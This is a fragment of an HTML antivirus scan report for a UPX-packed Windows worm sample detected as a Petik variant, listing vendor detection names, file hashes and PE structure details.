red;">WORM_PETIK.F</td</tr><tr><td>VBA32</td><td>3.12.10.7</td><td>2009.06.10</td><td style="color: red;">Win32.Worm.Petik.8192</td</tr><tr><td>ViRobot</td><td>2009.6.9.1775</td><td>2009.06.09</td><td style="color: red;">I-Worm.Win32.PetTick.5632</td</tr><tr><td>VirusBuster</td><td>4.6.5.0</td><td>2009.06.09</td><td style="color: red;">I-Worm.Petxfw.A</td</tr><tr><td colspan="4">&nbsp;</td></tr><tr><td colspan="4">Additional information</td></tr><tr><td colspan="4">File size: 5632 bytes</td></tr><tr><td colspan="4">MD5...: ca27691bf2137dc610588dd9f09de3b2</td></tr><tr><td colspan="4">SHA1..: 5b1aac1f8783d4123f3b88c213bc8321dc8d6a4a</td></tr><tr><td colspan="4">SHA256: d893879582f0f85973f009a957d3ca23766d5a1f178de8be59df320cfed2a1e5</td></tr><tr><td colspan="4">ssdeep: -<br></td></tr><tr><td colspan="4">PEiD..: UPX 2.90 [LZMA] -&gt; Markus Oberhumer, Laszlo Molnar &amp; John Reiser</td></tr><tr><td colspan="4">TrID..: File type identification<br>UPX compressed Win32 Executable (38.5%)<br>Win32 EXE Yoda's Crypter (33.4%)<br>Win32 Executable Generic (10.7%)<br>Win32 Dynamic Link Library (generic) (9.5%)<br>Win16/32 Executable Delphi generic (2.6%)</td></tr><tr><td colspan="4">PEInfo: PE Structure information<br><br>( base data )<br>entrypointaddress.: 0x6760<br>timedatestamp.....: 0x5adc2b0c (Sun Apr 22 06:26:20 2018)<br>machinetype.......: 0x14c (I386)<br><br>( 3 sections )<br>name        viradd    virsiz   rawdsiz  ntrpy  md5<br>UPX0        0x1000    0x5000       0x0   0.00  d41d8cd98f00b204e9800998ecf8427e<br>UPX1        0x6000    0x1000     0xa00   7.02  c899a53976a03c61209ae942100262c6<br>UPX2        0x7000    0x1000     0x200   1.89  e458949a2b40857c792182672efbb6e4<br><br>( 3 imports )  <br>&gt; KERNEL32.DLL: LoadLibraryA, GetProcAddress, ExitProcess<br>&gt; ADVAPI32.dll: RegCloseKey<br>&gt; USER32.dll: MessageBoxA<br><br>( 0 exports ) <br></td></tr><tr><td colspan="4">PDFiD.: -</td></tr><tr><td colspan="4">RDS...: NSRL Reference Data Set<br>-</td></tr><tr><td colspan="4">packers (Kaspersky): UPX</td></tr><tr><td colspan="4">Prevx info: &lt;a href='http://info.prevx.com/aboutprogramtext.asp?PX5=B3188732003C1E43163500FCB347000095858E0B' target='_blank'&gt;http://info.prevx.com/aboutprogramtext.asp?PX5=B3188732003C1E43163500FCB347000095858E0B&lt;/a&gt;</td></tr></table></span>
+</div></body>
+</html>
